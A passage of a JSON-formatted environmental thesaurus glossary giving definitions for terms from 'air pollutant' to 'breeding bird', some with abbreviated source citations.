planetary winds. Two main components are recognized: first, the latitudinal meridional component due to the Coriolis force (a deflecting motion or force discussed by G.G. de Coriolis in 1835. The rotation of the Earth causes a body moving across its surface to be deflected to the right in the N hemisphere and to the left in the S hemisphere); and secondly, the longitudinal component and the vertical movement, resulting largely from varying pressure distributions due to differential heating and cooling of the Earth's surface.\\\\n(Source: WHIT)\"], \"air pollutant\": [\"Any pollutant agent or combination of such agents, including any physical, chemical, biological, radioactive substance or matter which is emitted into or otherwise enters the ambient air and can, in high enough concentrations, harm humans, animals, vegetation or material.\\\\n(Source: LEE /  TOE)\"], \"air pollution\": [\"Presence in the atmosphere of large quantities of gases, solids and radiation produced by the burning of natural and artificial fuels, chemical and other industrial processes and nuclear explosions.\"], \"airport\": [\"A landing and taking-off area for civil aircraft, usually with surfaced runways and aircraft maintenance and passenger facilities.\"], \"air quality\": [\"The degree to which air is polluted; the type and maximum concentration of man-produced pollutants that should be permitted in the atmosphere.\\\\n(Source: ALL /  WRIGHT)\"], \"air quality control\": [\"The measurement of ambient air-pollution concentrations in order to determine whether there is a problem in a given region.\\\\n(Source: CONFERa)\"], \"air safety\": [\"Any measure, technique or design intended to reduce the risk of harm posed by either moving vehicles or projectiles above the earth's surface or pollutants to the earth's atmosphere.\"], \"air temperature\": [\"The temperature of the atmosphere which represents the average kinetic energy of the molecular motion in a small region and is defined in terms of a standard or calibrated thermometer in thermal equilibrium with the air.\"], \"air traffic\": [\"Aircraft moving in flight or on airport runways.\"], \"air traffic law\": [\"International rules and conventions relating to air transportation.\"], \"air traffic regulation\": [\"Rules and regulations that govern civil and military air traffic.\"], \"air transportation\": [\"The use of aircraft, predominantly airplanes, to move passengers and cargo.\"], \"alarm\": [\"The act of signalling an impending danger in order to call attention to some event or condition.\", \"A signal given to call attention to some event or condition which may be an impending danger.\"], \"alcohol\": [\"A group of organic chemical compounds composed of carbon, hydrogen, and oxygen. The molecules in the series vary in chain length and are composed of a hydrocarbon plus a hydroxyl group. Alcohol includes methanol and ethanol.\\\\n(Source: EIADOE)\", \"A flammable, colorless liquid which is used amongst others as solvent, disinfectant and intoxicant.\", \"A drink (a liquor or brew) containing ethanol, commonly known as alcohol.\"], \"alga\": [\"Simple, green, aquatic plants without stems, roots or leaves. They are found floating in the sea and fresh water, but they also grow on the surface of damp walls, rocks, the bark of trees and on soil.\\\\n(Source: WRIGHT)\"], \"algal bloom\": [\"Excessive and rapid growth of algae and other aquatic plants. It takes place when there are too many nutrients in the water through pollution from agricultural areas, i.e. higher levels of nitrogen and phosphates.\"], \"algicide\": [\"Any substance or chemical applied to kill or control algal growth.\"], \"alicyclic compound\": [\"Any substance composed of two or more unlike atoms held together by chemical bonds characterized by straight-chained, branched or cyclic properties.\"], \"alicyclic hydrocarbon\": [\"A class of organic compounds containing only carbon and hydrogen atoms joined to form one or more rings and having the properties of both aliphatic and cyclic substances.\\\\n(Source: MGH /  RRDA)\"], \"aliphatic compound\": [\"Any organic compound of hydrogen and carbon characterized by a straight chain of the carbon atoms.\\\\n(Source: MGH)\"], \"aliphatic hydrocarbon\": [\"Hydrocarbons having an open chain of carbon atoms, whether normal or forked, saturated or unsaturated.\\\\n(Source: MGH)\"], \"alkali land\": [\"Any geomorphic area, often a level lake-like plain, with soil containing a high percentage of mineral salts, located especially in arid regions.\\\\n(Source: MHD / RHW)\"], \"alkali soil\": [\"Soil that contains sufficient exchangeable sodium to interfere with water penetration and crop growth, either with or without appreciable quantities of soluble salts.\\\\n(Source: LANDY)\"], \"alkane\": [\"Paraffins. A homologous series of saturated hydrocarbons having the general formula CnH2n+2. Their systematic names end in -ane. They are chemically inert, stable, and flammable. The first four members of the series (methane, ethane, propane, butane) are gases at ordinary temperatures; the next eleven are liquids, and form the main constituents of paraffin oil; the higher members are solids. Paraffin waxs consists mainly of higher alkanes.\\\\n(Source: UVAROV)\", \"Member of the homologous series of saturated hydrocarbons having the general formula CnH2n+2.\"], \"alkyl compound\": [\"Compound containing one or more alkyl radicals.\"], \"allergen\": [\"Any antigen, such as pollen, a drug, or food, that induces an allergic state in humans or animals.\\\\n(Source: MGH)\"], \"allergy\": [\"A condition of abnormal sensitivity in certain individuals to contact with substances such as proteins, pollens, bacteria, and certain foods. This contact may result in exaggerated physiologic responses such as hay fever, asthma, and in severe enough situations, anaphylactic shock.\\\\n(Source: KOREN)\"], \"allocation\": [\"The assignment or allotment of resources to various uses in accord with a stated goal or policy.\\\\n(Source: ODE)\"], \"alloy\": [\"Any of a large number of substances having metallic properties and consisting of two or more elements; with few exceptions, the components are usually metallic elements.\"], \"alluvion\": [\"An overflowing; an inundation or flood, especially when the water is charged with much suspended material.\\\\n(Source: BJGEO)\"], \"alpha radiation\": [\"A stream of alpha particles which are ejected from many radioactive substances having a penetrating power of a few cm in air but can be stopped by a thin piece of paper.\"], \"alternative technology\": [\"Technology that aims to utilize resources sparingly, with minimum damage to the environment.\"], \"alumina\": [\"A natural or synthetic oxide of aluminum widely distributed in nature, often found as a constituent part of clays, feldspars, micas and other minerals, and as a major component of bauxite.\"], \"alveolus\": [\"A tiny, thin-walled, capillary-rich sac in the lungs where the exchange of oxygen and carbon dioxide takes place.\"], \"amalgam\": [\"A solution of a metal in mercury.\"], \"Americas\": [\"Continent which extends on a great part of the Occidental Hemisphere of the Earth, from the Artic Ocean in the North, to the Cape Horn in the South at the confluence of the Atlantic and Pacific Oceans, which delimits the continent on the East and West respectively.\"], \"Ames test\": [\"A bioassay developed by Bruce N. Ames in 1974, performed on bacteria to assess the capability of environmental chemicals to cause mutations.\"], \"amine\": [\"One of a class of organic compounds which can be considered to be derived from ammonia by replacement of one or more hydrogens by organic radicals.\\\\n(Source: MGH)\"], \"amino acid\": [\"Organic compounds containing a carboxyl group (-COOH) and an amino group (-NH2). About 30 amino acids are known. They are fundamental constituents of living matter because protein molecules are made up of many amino acid molecules combined together. Amino acids are synthesized by green plants and some bacteria, but some (arginine, histidine, lysine. threonine, methionine, isoleucine, leucine, valine, phenylalanine, tryptophane) cannot be synthesized by animals and therefore are essential constituents of their diet. Proteins from specific plants may lack certain amino acids, so a vegetarian diet must include a wide range of plant products.\\\\n(Source: ALL)\"], \"ammonia\": [\"A colorless gaseous alkaline compound that is very soluble in water, has a characteristic pungent odour, is lighter than air, and is formed as a result of the decomposition of most nitrogenous organic material.\"], \"ammonification\": [\"Addition of ammonia or ammonia compounds, especially to the soil.\"], \"ammonium\": [\"A positively charged polyatomic cation of the chemical formula NH4+ formed by protonation of ammonia (NH3).\"], \"amphibian\": [\"A class of vertebrate animals characterized by a moist, glandular skin, gills at some stage of development, and no amnion during the embryonic stage.\\\\n(Source: MGH)\"], \"amusement park\": [\"An open-air entertainment area consisting of stalls, side shows etc.\\\\n(Source: CED)\"], \"analysis\": [\"The mathematical study of functions, sequences, series, limits, derivatives and integrals.\"], \"analytical chemistry\": [\"The branch of chemistry dealing with techniques which yield any type of information about chemical systems.\\\\n(Source: MGH)\"], \"analytical method\": [\"Method to analyse the performance of a process or system.\"], \"anatomy\": [\"The science concerned with the physical structure of animals and plants.\"], \"angiosperm\": [\"The division of seed plants that includes all the flowering plants, characterized by the possession of flowers. The ovules, which become seeds after fertilization, are enclosed in ovaries. The xylem contains true vessels. The angiospermae are divided into two subclasses: Monocotyledoneae and Dycotiledoneae.\\\\n(Source: ALL)\"], \"angling\": [\"The art or sport of catching fish with a rod and line and a baited hook or other lure, such as a fly.\"], \"animal disease\": [\"A disease that is mainly found in certain animals (and not in plants or humans).\"], \"animal ecology\": [\"A study of the relationships of animals to their environment.\\\\n(Source: MGH)\"], \"animal experiment\": [\"Investigation carried out in animals for research purposes.\"], \"animal genetics\": [\"The scientific study of the hereditary material of animals for theoretical and practical applications such as increased population, conservation and disease research.\\\\n(Source: EEN)\"], \"animal housing\": [\"Any kind of shelter, refuge affording protection to animals.\"], \"animal husbandry\": [\"A branch of agriculture concerned with the breeding and feeding of domestic animals.\\\\n(Source: MGH)\"], \"animal manure\": [\"Animal excreta collected from stables and barnyards with or without litter; used to enrich the soil.\\\\n(Source: MGH)\"], \"animal noise\": [\"Noise caused by animals such as dogs kept in kennels or in private homes as pets.\"], \"animal nutrition\": [\"Ingestion, digestion and/or assimilation of food by animals.\"], \"animal physiology\": [\"Study of the normal processes and metabolic functions of animal organisms.\\\\n(Source: LBC)\"], \"animal protection\": [\"Precautionary actions or procedures taken to prevent or reduce the harm to sentient, non-human species, posed, in most cases, by humans.\"], \"animal for slaughter\": [\"Animals bred and killed for the production of food.\"], \"animal shelter\": [\"A protection providing housing for animals in bad weather. (Source: RRDA)\", \"A facility that houses homeless, lost or abandoned animals; primarily a large variety of dogs and cats and other animals used as pets.\"], \"animal\": [\"Any living organism characterized by voluntary movement, the possession of cells with noncellulose cell walls and specialized sense organs enabling rapid response to stimuli, and the ingestion of complex organic substances such as plants and other animals.\", \"Any living organism of the Animalia reign except human\", \"Of or relating to animals.\"], \"animal trade\": [\"The process or act of exchanging, buying or selling animals, especially livestock.\"], \"anion\": [\"An ion that is negatively charged.\"], \"annelid\": [\"An animal member of the phylum Annelida.\"], \"antagonism\": [\"The situation in which two chemicals upon interaction interfere in such a way that the action of one partially or completely inhibits the effects of the other.\"], \"Antarctica\": [\"A continent lying chiefly within the Antarctic Circle and asymmetrically centered on the South Pole.\"], \"Antarctic ecosystem\": [\"The ecosystem of the antarctic region of planet Earth.\"], \"Antarctic Ocean\": [\"The waters, including ice shelves, that surround the continent of Antarctica, which comprise the southernmost parts of the Pacific, Atlantic and Indian oceans, and also the Ross, Amundsen, Bellingshausen and Weddell seas.\"], \"Antarctic region\": [\"An area within the Antarctic Circle that includes the fifth largest continent and its surrounding waters, consisting mostly of thick ice shelves.\\\\n(Source: INP / CIA)\"], \"anthropic activity\": [\"Action resulting from or influenced by human activity or intervention.\"], \"anthropologic reserve\": [\"Area of protection of the life style of societies where traditional human activities are still maintained and the exploitation of natural resources is still carried out without compromising the future availability.\"], \"antibiotic\": [\"A chemical substance, produced by microorganisms and synthetically, that has the capacity to inhibit the growth of, and even to destroy, bacteria and other microorganisms.\"], \"antibody\": [\"A complex protein that is produced in response to the introduction of a specific antigen into an animal. Antibodies belong to a class of proteins called immunoglobins, which are formed by plasma cells in the blood as a defence mechanism against invasion by parasites, notably bacteria and viruses, either by killing them or rendering them harmless.\\\\n(Source: ALL2)\"], \"anticipation of danger\": [\"The act of foreseeing, expecting and taking measures against possible future exposure to harm, death or a thing that causes these.\\\\n(Source: ISEP)\"], \"apartment block\": [\"An apartment building in which each apartment is individually wholly owned and the common areas are jointly owned.\"], \"apiculture\": [\"The agricultural practice of intentional maintenance of honey bee colonies.\"], \"appeal\": [\"Resort to a superior court to review the decision of an inferior court or administrative agency.\", \"Request turned to an administrative or judicial organ in order to obtain the review or revocation of an action or provision.\", \"To take a court case to a higher court for review.\"], \"appeal procedure\": [\"Procedure through which it is possible to resort to a superior court to review the decision of an inferior court.\"], \"applied ecology\": [\"The application of ecological principles to the solution of human problems.\"], \"applied science\": [\"Science whose results are employed in technical applications.\"], \"aquaculture\": [\"The cultivation and harvest of freshwater or marine animals and plants, in ponds, tanks, cages or on protected beds.\"], \"aquatic animal\": [\"Animal having a water habitat.\"], \"aquatic ecology\": [\"The study of the relationships among aquatic living organisms and between those organisms and their environment.\\\\n(Source: ALLa)\"], \"aquatic mammal\": [\"A diverse group of roughly 120 species of mammal that are primarily ocean-dwelling or depend on the ocean for food.\"], \"aquatic organism\": [\"Organisms which live in water.\\\\n(Source: PHC)\"], \"aquatic plant\": [\"Plant adapted for a partially or completely submerged life.\"], \"aqueduct\": [\"A channel for supplying water; often underground, but treated architecturally on high arches when crossing valleys or low ground.\", \"Duct for conveying water to a given place.\", \"Canal or passage in the body in which liquids flow.\"], \"aquifer\": [\"Layers of rock, sand or gravel that can absorb water and allow it to flow.\"], \"arable farming\": [\"Growing crops as opposed to dairy farming, cattle farming, etc.\"], \"arboriculture\": [\"The planting and care of woody plants, especially trees.\"], \"archaeological site\": [\"Any location containing significant relics and artifacts of past culture.\\\\n(Source: LANDY)\"], \"archaeology\": [\"The scientific study of the material remains of the cultures of historical or prehistorical peoples.\\\\n(Source: MGH)\"], \"archipelago\": [\"A group of many islands including the waters that surround them.\\\\n(Source: DOE)\", \"A cluster of several islands.\"], \"architecture\": [\"The art and science of designing and building structures, or large groups of structures, in keeping with aesthetic and functional criteria.\", \"A specification that identifies components and their associated functionality, describes connectivity of components, and describes the mapping of functionality onto components.\"], \"Arctic Ocean\": [\"The smallest and most poorly studied of the oceans on earth. It covers an area of 14 million square km that is divided by three submarine ridges, i.e. the Alpha Ridge, the Lomonosov Ridge, and an extension of the mid-Atlantic ridge. It is also nearly landlocked, covered\\\\nyear-round by pack ice, and the third of its area is continental shelf.\\\\n(Source: OCEAN)\"], \"Arctic region\": [\"The northernmost area of the earth, centered on the North Pole, that includes the Arctic Ocean, the northern reaches of Canada, Alaska, Russia, Norway and most of Greenland, Iceland and Svalbard.\\\\n(Source: INP)\"], \"distribution area\": [\"The overall geographical distribution of a talon.\"], \"armament\": [\"The weapons, ammunition and equipment held by a military unit or state.\", \"The total force held by a military unit or state.\"], \"armed forces\": [\"The military units of a state, typically divided by their differing contexts of operations, such as the army, navy, air force and marines.\"], \"aromatic compound\": [\"Compound characterized by the presence of at least one benzene ring.\"], \"aromatic hydrocarbon\": [\"Hydrocarbon having an unsaturated ring containing alternating double and single bonds, especially containing a benzene ring.\"], \"aromatic substance\": [\"Substance having a distinctive, usually fragrant smell.\"], \"arsenic\": [\"A toxic metalloid element with symbol As and atomic number 33, existing in several allotropic forms, that occurs principally in realgar and orpiment and as the free element. It is used in semiconductors, lead-based alloys, and high temperature brasses.\"], \"art\": [\"The creation of works of beauty or other special significance.\", \"The products of human creativity; works of art collectively.\", \"A superior skill that one can learn by study, practice, and observation.\", \"Photographs or other visual representations in a printed publication.\"], \"arthropod\": [\"The largest phylum in the animal kingdom; adults typically have segmented body, a sclerotized integument, and many-jointed segmental limbs.\\\\n(Source: MGH)\", \"Animal member of the phylum Arthropoda.\"], \"Articulata\": [\"Animals characterized by the repetition of similar segments (metameres), exhibited especially by arthropods, annelids, and vertebrates in early embryonic stages and in certain specialized adult structures.\"], \"artificial lake\": [\"Lake created behind manmade barriers.\"], \"asbestos\": [\"Generic name for a group of fibrous mineral silicates.\"], \"asbestos cement\": [\"A hardened mixture of asbestos fibers, Portland cement and water used in relatively thin slabs for shingles, wallboard and siding.\"], \"ASEAN\": [\"Association of Southeast Asian Nations. Regional organization of states of Southeast Asia created on august 8th, 1967.\"], \"ash\": [\"The incombustible matter remaining after a substance has been incinerated.\", \"Any of the trees belonging to the genus Fraxinus.\", \"Wood of the ash tree.\"], \"Asia\": [\"The world's largest continent. It occupies the eastern part of the Eurasian landmass and its adjacent islands and is separated from Europe by the Ural Mountains. Asia borders on the Arctic Ocean, the Pacific Ocean, the Indian Ocean, and the Mediterranean and Red Seas in the west. It includes the largest peninsulas of Asia Minor, India, Arabia, and Indochina and the island groups of Japan, Indonesia, the Philippines, and Ceylon.\"], \"assimilation\": [\"Conversion of nutritive material to living tissue.\\\\n(Source: KOREN)\"], \"association\": [\"A formal association of people with similar interests.\"], \"astronautics\": [\"The science of space flight.\"], \"astronomy\": [\"The science concerned with celestial bodies and the observation and interpretation of the radiation received in the vicinity of the earth from the component parts of the universe.\"], \"atlas\": [\"A bound collection of maps or charts, plates, engravings or tables illustrating any subject.\", \"The most superior (first) cervical vertebra of the spine.\"], \"atmosphere\": [\"The gaseous envelope surrounding the Earth in a several kilometers-thick layer.\", \"Gaseous envelope of a celestial body.\", \"A store's physical characteristics that are used to develop an image and draw customers.\"], \"atmospheric chemistry\": [\"The study of the production, transport, modification, and removal of atmospheric constituents in the troposphere and stratosphere.\"], \"atmospheric circulation\": [\"The general movement and circulation of air, which transfers energy between different levels of the atmosphere.\"], \"atmospheric humidity\": [\"A measurable quantity of the moisture content found in the earth's atmosphere.\\\\n(Source: RHW)\"], \"atmospheric model\": [\"A simulation, pattern or plan designed to demonstrate the structure or workings of the atmosphere surrounding any object, including the Earth.\\\\n(Source: APD)\"], \"atmospheric ozone\": [\"A triatomic molecule of oxygen; a natural constituent of the atmosphere, with the highest concentrations in the ozone layer or stratosphere; it is found at a level between 15 and 30 km above the Earth, which prevents harmful ultraviolet B radiation, which causes skin cancer and threatens plant life, from reaching the ground. The fragile shield is being damaged by chemicals released on Earth. The main chemicals that are depleting stratospheric ozone are chlorofluorocarbons (CFCs), which are used in refrigerators, aerosols and as cleaners in many industries and halons, which are used in fire extinguishers. The damage is caused when these chemicals release highly reactive forms of chlorine and bromine.\\\\n(Source: GILP96 /  WRIGHT)\"], \"atmospheric physics\": [\"The study of the physical phenomena of the atmosphere.\"], \"atmospheric precipitation\": [\"The settling out of water from cloud in the form of rain, hail, snow, etc.\"], \"atmospheric science\": [\"The sciences that study the dynamics, physics and chemistry of atmospheric phenomena and processes.\"], \"attribution\": [\"Under certain circumstances, the tax law applies attribution rules to assign to one taxpayer the ownership interest of another taxpayer.\\\\n(Source: WESTS)\", \"Act of accrediting an author or an artist for creating a specific work or idea.\"], \"audiovisual media\": [\"Any means of communication transmitted to both the sense of hearing and the sense of sight, especially technologies directed to large audiences.\"], \"autoecology\": [\"That part of ecology which deals with individual species and their reactions to environmental factors.\\\\n(Source: UNUN)\"], \"automobile industry\": [\"Branch of industry that manufactures automobiles.\"], \"avalanche\": [\"A fall or slide of a large mass, as of snow or rock, down a mountainside.\", \"Great quantity of ice or snow that falls down suddenly from a mountain slope while  increasing in volume and speed.\"], \"avalanche protection\": [\"The total of measures and devices implemented to protect people, property or natural resources from avalanche conditions, including avalanche forecasting and warning, avalanche zoning, ski testing and the use of explosives and other equipment to stabilize an avalanche area.\"], \"aviation law\": [\"International rules regulating air transportation.\"], \"avifauna\": [\"All the birds in a particular region.\"], \"background level\": [\"Term used in a variety of situations, always as the constant or natural amount of a given substance, radiation, noise, etc.\"], \"background radiation\": [\"Radiation resulting from natural sources, as opposed to man-made sources, and to which people are exposed in everyday, normal life; for example from rocks and soil.\"], \"bacterial bed\": [\"A device that removes some suspended solids from sewage.\"], \"bactericide\": [\"An agent that destroys bacteria.\"], \"bacteriology\": [\"The science and study of bacteria.\"], \"banking\": [\"Transactional business between any bank and that bank's clients or customers.\"], \"barium\": [\"A soft silvery-white metallic element of the alkaline earth group. It has the symbol Ba, and atomic number 56. It is used in bearing alloys and compounds are used as pigments.\\\\n(Source: CED)\"], \"baseline monitoring\": [\"Monitoring of long-term changes in atmospheric compositions of particular significance to the weather and the climate.\\\\n(Source: YOUNG)\"], \"basic food requirement\": [\"The minimum nutriments deemed necessary for a person of a particular age, gender, physiological condition and activity level to sustain life, health and growth.\"], \"basicity\": [\"The state of a solution of containing an excess of hydroxyl ions.\"], \"basidiomycete\": [\"Any of various fungi of the subdivision Basidiomycota.\"], \"bathing water\": [\"A body of water where bathing is permitted.\"], \"battery\": [\"A cell or several cells connected together, each cell containing the essentials for producing voltaic electricity.\"], \"bay\": [\"(Laurus nobilis) A shrub of the family Lauraceae.\", \"An open, curving indentation made by the sea or a lake into a coastline.\", \"To produce a loud, short, explosive sound similar to that of a dog.\", \"A herb made from a leaf of several of the shrubs of the family Lauraceae.\", \"A compartment in an aircraft used for some specific purpose.\"], \"beach\": [\"A lat, narrow strip of sand, gravel or pebbles along the shoreline of a body of water (ocean, river, lake).\", \"To land on a beach; (of animals) to become stranded out of the water.\"], \"beaching\": [\"The washing ashore of whales or other cetaceans that have died for natural causes, or because of highly polluted sea water or after being trapped in drift nets.\"], \"bee conservation\": [\"The care, preservation and husbandry of hymenopterous insects valued for their ability to pollinate crops and other flora or for their production of honey.\"], \"beef cattle\": [\"Cattle bred for the production of meat.\"], \"bee\": [\"Any of the membranous-winged insects which compose the superfamily Apoidea in the order Hymenoptera characterized by a hairy body and by sucking and chewing mouthparts.\", \"The second letter of the Roman alphabet.\"], \"beetle\": [\"Any insect of the order Coleoptera, having biting mouthparts and forewings modified to form shell-like protective elytra.\"], \"beneficial organism\": [\"Any pollinating insect, or any pest predator, parasite, pathogen or other biological control agent which functions naturally or as part of an integrated pest management program to control another pest.\\\\n(Source: LEE)\"], \"benthic division\": [\"The bottom of a body of water often occupied by benthos.\\\\n(Source: GILP96)\"], \"benthic ecosystem\": [\"The interacting system of the biological communities located at the bottom of bodies of freshwater and saltwater and their non-living environmental surroundings.\\\\n(Source: TOE / DOE)\"], \"benthos\": [\"Those organisms attached to, living on, in or near the bottom of the sea, river bed or lake floor.\"], \"benzene\": [\"A colorless, liquid, flammable, aromatic hydrocarbon used to manufacture styrene and phenol. Also known as benzol.\\\\n(Source: MGH)\"], \"benzopyrene\": [\"A five-ring aromatic hydrocarbon found in coal tar, in cigarette smoke, and as a product of incomplete combustion.\"], \"beryllium\": [\"A corrosion-resistant, toxic silvery-white metallic element that occurs chiefly in beryl and is used mainly in x-ray windows and in the manufacture of alloys. Symbol: Be, atomic number: 4.\"], \"beta radiation\": [\"Ionizing radiation which is produced as a stream of high speed electrons emitted by certain types of radioactive substance when they decay.\"], \"beverage industry\": [\"Industry sector which produces beverages.\"], \"beverage\": [\"Any one of various liquids for drinking.\"], \"bibliography\": [\"A complete or selective listing of documents by a given subject, author or publisher, often including the description and identification of the editions, dates of issue, titles, authorship, publishers or other written materials.\\\\n(Source: RHW / ISEP)\"], \"bicycle\": [\"A vehicle with two wheels in tandem, pedals connected to the rear wheel by a chain, handlebars for steering, and a saddlelike seat.\"], \"bilateral convention\": [\"An international agreement, especially one dealing with a specific matter, involving two or both sides, factions, or the like.\"], \"bilge oil\": [\"Waste oil that accumulates, usually in small quantities, inside the lower spaces of a ship, just inside the shell plating, and usually mixed with larger quantities of water.\"], \"bilge water\": [\"Water that builds up in the bottom of a ship's bilge.\"], \"bioaccumulation\": [\"The accumulation of pollutants in living organisms by direct adsorption or through food chains.\"], \"bio-availability\": [\"The extent to which a drug or other substance is taken up by a specific tissue or organ after administration.\\\\n(Source: ZINZAN /  CEDa)\"], \"biochemistry\": [\"The study of chemical substances occurring in living organisms and the reactions and methods for identifying these substances.\"], \"biocide\": [\"A diverse group of poisonous substance including preservatives, insecticides, disinfectants and pesticides used for the control of organisms that are harmful to human or animal health or that cause damage to natural or manufactured products.\\\\n(Source: GRAHAW)\"], \"bioclimatology\": [\"The study of climate in relation to fauna and flora.\"], \"biocoenosis\": [\"A community or natural assemblage of organisms; often used as an alternative to ecosystem but strictly is the fauna/flora association excluding physical aspects of the environment.\"], \"bioconcentration factor\": [\"The quotient of the concentration of a chemical in aquatic organisms at a specific time or during a discrete time period of exposure, divided by the concentration in the surrounding water at the same time or during the same period.\\\\n(Source: KOREN)\"], \"biodegradability\": [\"The extent to which a substance can be decomposed - or rotted - by bacteria and fungi.\"], \"biodegradation\": [\"Breaking down of a substance by microorganisms.\"], \"biodiversity\": [\"Number and variety of living organisms; includes genetic diversity, species diversity, and ecological diversity.\"], \"bioethics\": [\"The study of ethical problems arising from biological research and its applications in such fields as organ transplantation, genetic engineering, or artificial insemination.\"], \"biogas\": [\"Gas, rich in methane, which is produced by the fermentation of animal dung, human sewage or crop residues in an air-tight container.\"], \"biogeochemical cycle\": [\"Movement of chemical elements in a circular pathway, from organisms to physical environment, back to organisms.\"], \"biogeochemistry\": [\"The study of the chemical, physical, geological, and biological processes and reactions that govern the composition of the natural environment and its energy transportation cycles.\"], \"biogeographical region\": [\"Area of the Earth's surface defined by the species of fauna and flora it contains.\"], \"biogeography\": [\"The science concerned with the geographical distribution of animal and plant life.\"], \"biological engineering\": [\"The application of engineering principles and techniques to biology and medicine. It is largely concerned with the design of replacement body parts, such as limbs, heart valves, etc.\"], \"biological indicator\": [\"A species or organism that is used to grade environmental quality or change.\"], \"biological monitoring\": [\"The direct measurement of changes in the biological status of a habitat, based on evaluations of the number and distribution of individuals or species before and after a change.\\\\n(Source: ALL)\"], \"biological nitrogen fixation\": [\"A process in which atmospheric nitrogen is converted to ammonia by a pair of bacterial enzymes called nitrogenase.\"], \"biological pest control\": [\"Any living organism applied to or introduced into the environment that is intended to function as a pesticide against another organism declared to be a pest.\"], \"biological weapon\": [\"Living organisms (or infective material derived from them) which are intended to cause disease or death in animals, plants, or man, and which depend for their effects on their ability to multiply in the person, animal or plant attacked. Various living organisms (for example, rickettsiae, viruses and fungi), as well as bacteria, can be used as weapons.\"], \"biology\": [\"A division of the natural sciences concerned with the study of life and living organisms.\"], \"bioluminescence\": [\"The production of light of various colors by living organisms, e.g. some bacteria and fungi, glow-worms and many marine animals).\"], \"biomass\": [\"Biomass refers strictly speaking to the total weight of all the living things in an ecosystem. However, it has come to refer to the amount of plant and crop material that could be produced in an ecosystem for making biofuels and other raw materials used in industry, for example.\\\\n(Source: WRIGHT)\"], \"biophysics\": [\"The science involving the application of physical principles and methods to study and explain the structures of living organisms and the mechanics of life processes.\"], \"bioreactor\": [\"A container, such as a large fermentation chamber, for growing living organisms that are used in the industrial production of substances such as pharmaceuticals, antibodies, or vaccines.\"], \"biorhythm\": [\"A cyclically recurring pattern of physiological states in an organism or organ, such as alpha rhythm or circadian rhythm; believed by some to affect physical and mental states and behaviour.\"], \"biosafety\": [\"The combination of knowledge, techniques and equipment used to manage or contain potentially infectious materials or biohazards in the laboratory environment, to reduce or prevent harm to laboratory workers, other persons and the environment.\"], \"biosphere\": [\"That part of the Earth and atmosphere capable of supporting living organisms.\"], \"biosphere reserve\": [\"Protected land and coastal areas that are approved under the Man and Biosphere programme (MAB) in conjunction with the Convention on International Trade in Endangered Species (CITES). Each reserve has to have an ecosystem that is recognized for its diversity and usefulness as a conservation unit. The reserves have at least one core area where there can be no interference with the natural ecosystem. A transition zone surrounds this and within it scientific research is allowed. Beyond this is a buffer zone which protects the whole reserve from agricultural, industrial and urban development. Biosphere reserves and buffer zones were regarded as examples of a new generation of conservation techniques.\\\\n(Source: WRIGHT)\"], \"biosynthesis\": [\"Production, by synthesis or degradation, of a chemical compound by a living organism.\\\\n(Source: MGH)\"], \"biotechnology\": [\"A combination of biology and technology. It is used to describe developments in the application of biological organisms for commercial and scientific purposes.\"], \"biotic factor\": [\"The influence upon the environment of organisms owing to the presence and activities of other organisms, as distinct from a physical, abiotic, environmental factor.\"], \"biotope\": [\"A region of relatively uniform environmental conditions, occupied by a given plant community and its associated animal community.\"], \"biotope network\": [\"Intersection of corridors connecting patchy ecological communities. Species survival tends to be higher in patches that have higher connectivity.\"], \"biotope protection\": [\"Measures taken to ensure that the biological and physical components of a biotope are in equilibrium by maintaining constant their relative numbers and features.\"], \"bird\": [\"Any of the bipedal, warm-blooded vertebrates that lay eggs having wings which, for most species, enables them to fly.\", \"A powered heavier-than-air aircraft with fixed wings that obtains lift by the Bernoulli effect and is used for transportation.\", \"Badminton equipment consisting of a ball of cork or rubber with a crown of feathers.\"], \"bird sanctuary\": [\"Special area where birds are protected.\"], \"bird of prey\": [\"Any of various carnivorous bird of the orders Falconiformes and Strigiformes which feed on meat taken by hunting.\"], \"bird species\": [\"Any species of the warm-blooded vertebrates which make up the class Aves.\"], \"birth control\": [\"Limitation of the number of children born by preventing or reducing the frequency of impregnation.\", \"The intentional prevention of pregnancy through the use of various devices, practices, surgical procedures or medication.\"], \"bitumen\": [\"A generic term applied to natural inflammable substances of variable colour, hardness, and volatility, composed principally of a mixture of hydrocarbons substantially free from oxygenated bodies.\"], \"black coal\": [\"A natural black graphitelike material used as a fuel, formed from fossilized plants and consisting of amorphous carbon with various organic and some inorganic compounds.\"], \"blast furnace\": [\"A tall, cylindrical smelting furnace for reducing iron ore to pig iron; the blast of air blown through solid fuel increases the combustion rate.\"], \"bleaching agent\": [\"A chemical that removes colors or whitens.\"], \"bleaching clay\": [\"Clay capable of chemically adsorbing oils, insecticides, alkaloids, vitamins, carbohydrates and other materials; it is used for refining and decolorizing mineral and vegetable oils.\"], \"bleaching process\": [\"The process of removing colored components from a textile.\"], \"blue-green alga\": [\"Microorganisms, formerly classified as algae but now regarded as bacteria, including nostoc, which contain a blue pigment in addition to chlorophyll.\\\\n(Source: CED)\"], \"boating\": [\"To travel or go in a boat as a form of recreation.\"], \"boiler\": [\"An enclosed vessel in which water is heated and circulated, either as hot water or as steam, for heating or power.\"], \"boiling point\": [\"The temperature at which the transition from the liquid to the gaseous phase occurs in a pure substance at fixed pressure.\"], \"book\": [\"A collection of sheets of paper bound together to hinge at one edge, containing printed or written material, pictures, etc.\", \"Part of a larger published work.\", \"To record in a register.\", \"To arrange for (something for someone else) in advance.\", \"To engage for a performance.\"], \"bookkeeping\": [\"The art or science of recording business accounts and transactions.\"], \"border\": [\"The dividing line or frontier between political or geographic regions.\", \"The boundary line or the area immediately inside the boundary.\", \"The boundary of a surface.\", \"To have its boundary touch something; to share a border.\"], \"boron\": [\"A very hard almost colourless crystalline metalloid element that in impure form exists as a brown amorphous powder. It occurs principally in borax and is used in hardening steel.\"], \"botanical garden\": [\"A place in which plants are grown, studied and exhibited.\"], \"botany\": [\"A branch of the biological sciences which embraces the study of plants and plant life.\"], \"boundary layer\": [\"The layer of fluid adjacent to a physical boundary in which the fluid motion is significantly affected by the boundary and has a mean velocity less than the free stream value.\\\\n(Source: LBC)\"], \"bovid\": [\"Any animal belonging to the Bovidae family.\"], \"brackish water\": [\"Water, salty between the concentrations of fresh water and sea water; usually 5-10 parts x thousand.\"], \"bradyseism\": [\"The gradual uplift or descent of part of the Earth's surface caused by the filling or emptying of an underground magma chamber and/or hydrothermal activity.\"], \"breast milk\": [\"Milk from the breast for feeding babies.\"], \"breeding\": [\"The application of genetic principles to the improvement of farm animals and cultivated plants.\"], \"breeding bird\": [\"Individual in a bird population that are involved in reproduction during a particular period in a given place.\"], \"brewing 